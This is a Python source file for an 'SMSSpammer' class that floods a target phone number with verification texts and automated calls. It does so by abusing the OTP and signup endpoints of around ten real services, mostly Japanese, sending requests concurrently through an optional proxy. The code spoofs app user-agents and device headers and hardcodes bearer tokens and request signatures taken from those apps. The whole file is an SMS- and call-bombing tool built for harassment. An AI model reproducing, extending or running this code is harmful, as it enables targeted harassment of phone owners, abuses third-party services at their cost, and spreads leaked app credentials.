import asyncio
import random
import re
import string
import uuid
from base64 import b64encode
from typing import Optional

import httpx
from cryptography.hazmat.primitives.asymmetric import rsa

from .result import Result


class SMSSpammer:
    def __init__(self, proxy: Optional[str] = None):
        self.http = httpx.AsyncClient(proxy=proxy)

    def formatPhoneNumber(self, number):
        if len(number) == 11 and re.match(r"^(090|080|070)", number):
            return number[:3] + "-" + number[3:7] + "-" + number[7:]
        elif len(number) == 10 and re.match(r"^(03|06|02|052)", number):
            return number[:2] + "-" + number[2:6] + "-" + number[6:]
        elif len(number) == 9 and re.match(r"^(04|05|08|09)", number):
            return number[:2] + "-" + number[2:5] + "-" + number[5:]
        elif len(number) == 12 or len(number) == 14:
            return number[:4] + "-" + number[4:8] + "-" + number[8:]
        return number

    def randomString(self, n: int):
        return "".join(random.choices(string.ascii_letters + string.digits, k=n))

    async def sendSMSWithSahiCoin(self, phone: str):
        response = await self.http.post(
            "https://api.sahicoin.com/armor/api/v1/otp/send",
            headers={
                "x-app-device": "IOS",
                "x-app-version": "3.8",
                "x-app-build": "1",
                "user-agent": "SahiCoin/1 CFNetwork/3826.400.120 Darwin/24.3.0",
            },
            json={
                "action": "LOGIN",
                "phoneNumber": phone,
            },
        )
        return Result(
            serviceName="SahiCoin", statusCode=response.status_code, type="SMS"
        )

    async def sendSMSWithTaxiStockHolm(self, phone: str):
        privateKey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        publicKey = privateKey.public_key()
        numbers = publicKey.public_numbers()
        n = numbers.n
        e = numbers.e
        nB64 = b64encode(n.to_bytes((n.bit_length() + 7) // 8, byteorder="big")).decode(
            "utf-8"
        )
        eB64 = b64encode(e.to_bytes((e.bit_length() + 7) // 8, byteorder="big")).decode(
            "utf-8"
        )

        response = await self.http.post(
            "https://api.taxistockholm.se/v2/activation/initiate",
            headers={
                "X-Device-Id": str(uuid.uuid4()).upper(),
                "X-Client": "bed00752-3163-49c5-aeed-9c87b0d5f382",
            },
            json={
                "phone": phone,
                "publicKey": {
                    "alg": "RSA256",
                    "e": eB64,
                    "kid": "com.taxistockholm.taxiSthlm.otpactivation",
                    "kty": "RSA",
                    "n": nB64,
                    "use": "sign",
                },
            },
        )
        return Result(
            serviceName="TaxiStockHolm", statusCode=response.status_code, type="SMS"
        )

    async def sendSMSWithYSLB(self, phone: str):
        response = await self.http.get(
            f"https://www.yslb.jp/on/demandware.store/Sites-ysl-jp-ng-Site/ja_JP/SMSVerification-SendOTP?phone={phone}&ajax=true",
            headers={
                "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
            },
        )
        return Result(serviceName="YSLB", statusCode=response.status_code, type="SMS")

    async def sendSMSWithCaitech(self, phone: str):
        response = await self.http.post(
            "https://api.caitech.co.jp/sms/", json={"phoneNumber": phone}
        )
        return Result(
            serviceName="Caitech", statusCode=response.status_code, type="SMS"
        )

    async def sendSMSWithTimee(self, phone: str):
        response = await self.http.get(
            f"https://api.taimee.co.jp/api/v2/auth/authorize?phone_number={phone}",
            headers={
                "x-main-signature": "XoGOlHLw/wMF2G9mcFnUFXuoqpfltArOPREAtrqvIQzE4wLfSowGhRhChNy4FthmJ8TS+iFD3jmEIRtO6x7V571piB8i/aWACnXTGcmDNGkuo+dg//Bk52MLBTzLFJ81vQpMrK6Bpv6z9Vi8OH60pflkg3oHSlxx+Qxg98b6cJQiEUk5lWwtkilQGSPJ3b2nB5NbaRXIDiSLNZIlyYCN1pk1toCrkQ5Xovwbw18Bn+LiMkYtf/f3dZJHbEDT9EUNQqJxnUwiKUdNOTtP8ggKS09QAR8LhgoIwAoHCvKeV554ueJaM28J77OhhyG+YPmIHU/+i63UnFgy7cEL4Q==",
                "x-device-type": "IOS",
                "x-app-version": "25.03.27",
                "user-agent": "taimee-ios/1544 CFNetwork/3826.400.120 Darwin/24.3.0",
            },
        )
        return Result(serviceName="Timee", statusCode=response.status_code, type="SMS")

    async def sendSMSWithChiica(self, phone: str):
        response = await self.http.post(
            "https://api.furusato-token.jp/v1/lc/member/register/temporary",
            headers={
                "user-agent": "FurusatoLocalCurrency/2.14.7 CFNetwork/3826.400.120 Darwin/24.3.0"
            },
            data={
                "tel": phone,
                "password": self.randomString(10),
                "exist_check_flag": 1,
                "auth_code_length": 6,
            },
            timeout=60,
        )
        return Result(serviceName="Ciica", statusCode=response.status_code, type="SMS")

    async def sendSMSWithAmakusaNosari(self, phone: str):
        response = await self.http.post(
            "https://api.amakusa.premium-control.jp/auth/phone_number/send",
            headers={
                "authorization": "Bearer XQLLRh5MhF95NPIfgxsSdkTZUILBaABp79quNvhBIesz86n7GLRzCR9ONpdsBO7MHjon2LhxJxg9CO2w",
                "user-agent": "app/24 CFNetwork/3826.400.120 Darwin/24.3.0",
            },
            json={"phone_number": phone},
        )
        return Result(
            serviceName="AmakusaNosari", statusCode=response.status_code, type="SMS"
        )

    async def sendSMSWithHELPO(self, phone: str):
        response = await self.http.post(
            "https://core-platform.helpo.blue/core-platform/billing-sign-up",
            headers={
                "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
            },
            json={"phoneNumber": phone, "password": self.randomString(10)},
        )
        return Result(serviceName="HELPO", statusCode=response.status_code, type="SMS")

    async def sendSMSWithFCommu(self, phone: str):
        response = await self.http.post(
            "https://fuji-api.cacicar-commu.com/api/auth-payment/auth/login",
            headers={},
            json={
                "appId": "fe21e886-b206-440a-b9cb-fed9aa302ec9",
                "loginType": "SMS",
                "phoneNumber": phone,
                "useIvr": False,
            },
        )
        return Result(
            serviceName="F-commu", statusCode=response.status_code, type="SMS"
        )

    async def sendSMSWithRegionPay(self, phone: str):
        response = await self.http.post(
            "https://region-pay.com/appli_api/v2/createacc.php",
            headers={
                "x-app-language": "ja",
                "x-app-os-version": "18.3.2",
                "x-app-device-name": "iPhone SE 2nd Gen 18.3.2",
                "user-agent": "region%20PAY/1 CFNetwork/3826.400.120 Darwin/24.3.0",
                "x-app-version": "1.5.29",
                "x-app-country": "JP",
            },
            json={
                "device_name": "iPhone SE 2nd Gen 18.3.2",
                "password": self.randomString(12),
                "user_id": phone,
            },
        )
        return Result(
            serviceName="RegionPAY", statusCode=response.status_code, type="SMS"
        )

    async def sendSMSWithMixiM(self, phone: str):
        response = await self.http.post(
            "https://account.mixi.com/api/signup",
            headers={
                "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
            },
            json={
                "app_hash": "@account.mixi.com",
                "country_code": "JP",
                "phone_number": phone,
            },
        )
        return Result(serviceName="MixiM", statusCode=response.status_code, type="SMS")

    async def spam(
        self, phone: str, *, prefix: str = "+81", excludeSlowServices: bool = True
    ):
        phone = self.formatPhoneNumber(phone)

        services = []
        services.append(self.sendSMSWithSahiCoin(f"{prefix}{phone.replace("-", "")}"))
        services.append(self.sendSMSWithTaxiStockHolm(f"{prefix} {phone}"))
        services.append(self.sendSMSWithYSLB(phone.replace("-", "")))
        services.append(self.sendSMSWithCaitech(phone.replace("-", "")))
        services.append(self.sendSMSWithTimee(phone.replace("-", "")))
        services.append(self.sendSMSWithAmakusaNosari(phone.replace("-", "")))
        services.append(
            self.sendSMSWithHELPO(f"{prefix}{phone.replace("-", "").lstrip("0")}")
        )
        services.append(self.sendSMSWithFCommu(phone.replace("-", "")))
        services.append(
            self.sendSMSWithRegionPay(f"{prefix}{phone.replace("-", "").lstrip("0")}")
        )
        if not excludeSlowServices:
            services.append(self.sendSMSWithChiica(phone.replace("-", "")))
        return await asyncio.gather(*services)

    async def callWithCaitech(self, phone: str):
        response = await self.http.post(
            "https://api.caitech.co.jp/sms/phone_request/", json={"phoneNumber": phone}
        )
        return Result(
            serviceName="Caitech", statusCode=response.status_code, type="Call"
        )

    async def callWithAmakusaNosari(self, phone: str):
        response = await self.http.post(
            "https://api.amakusa.premium-control.jp/auth/phone_number/send",
            headers={
                "authorization": "Bearer XQLLRh5MhF95NPIfgxsSdkTZUILBaABp79quNvhBIesz86n7GLRzCR9ONpdsBO7MHjon2LhxJxg9CO2w",
                "user-agent": "app/24 CFNetwork/3826.400.120 Darwin/24.3.0",
            },
            json={"phone_number": phone},
        )
        response = await self.http.post(
            "https://api.amakusa.premium-control.jp/auth/phone_number/resend",
            headers={
                "authorization": "Bearer XQLLRh5MhF95NPIfgxsSdkTZUILBaABp79quNvhBIesz86n7GLRzCR9ONpdsBO7MHjon2LhxJxg9CO2w",
                "user-agent": "app/24 CFNetwork/3826.400.120 Darwin/24.3.0",
            },
            json={"is_call": 1, "token": response.json()["token"]},
        )
        return Result(
            serviceName="AmakusaNosari", statusCode=response.status_code, type="Call"
        )

    async def callWithFCommu(self, phone: str):
        response = await self.http.post(
            "https://fuji-api.cacicar-commu.com/api/auth-payment/auth/login",
            headers={},
            json={
                "appId": "fe21e886-b206-440a-b9cb-fed9aa302ec9",
                "loginType": "SMS",
                "phoneNumber": phone,
                "useIvr": True,
            },
        )
        return Result(
            serviceName="F-commu", statusCode=response.status_code, type="Call"
        )

    async def call(
        self, phone: str, *, prefix: str = "+81", excludeSlowServices: bool = True
    ):
        phone = self.formatPhoneNumber(phone)
        return await asyncio.gather(
            *[
                self.callWithCaitech(phone.replace("-", "")),
                self.callWithAmakusaNosari(phone.replace("-", "")),
                self.callWithFCommu(phone.replace("-", "")),
            ]
        )
